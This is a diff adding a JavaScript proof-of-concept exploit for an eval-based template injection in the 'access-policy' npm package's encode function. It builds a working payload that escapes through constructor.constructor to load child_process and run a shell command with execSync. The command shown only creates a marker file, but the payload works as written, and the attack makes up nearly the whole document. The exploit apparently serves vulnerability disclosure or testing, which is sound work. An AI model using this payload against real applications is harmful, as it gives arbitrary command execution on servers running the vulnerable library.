@@ -1,0 +1,33 @@
+```javascript
+'use strict';
+
+// access-policy's lib/encode.js builds a template string ("tmpl") like:
+//   var tmpl = literal.replace(/(\$\{)/gm, '$1data.');
+//   return eval('`' + tmpl + '`');
+// Any "${...}" sequence inside the JSON-stringified `statements` object
+// survives JSON.stringify and gets rewritten to "${data...." then eval'd
+// as a real template literal -> arbitrary JavaScript execution.
+
+global.data = {}; // gives the injected "data." prefix something to resolve to
+
+const { encode } = require('./node_modules/access-policy');
+
+const marker = '/tmp/access_policy_pwned';
+
+// After the "${" -> "${data." rewrite this becomes:
+// ${data.constructor.constructor('return process')().mainModule.require('child_process').execSync(...)}
+const payload =
+  "${constructor.constructor('return process')().mainModule" +
+  ".require('child_process').execSync('touch " + marker + "')}";
+
+const statements = { evil: payload };
+
+try {
+  encode(statements, {}); // triggers eval() inside tmpl/template() -> RCE
+} catch (e) {
+  // Parsing the eval'd output back as JSON may fail; the command already ran.
+}
+
+const fs = require('fs');
+console.log('RCE triggered:', fs.existsSync(marker));
+```
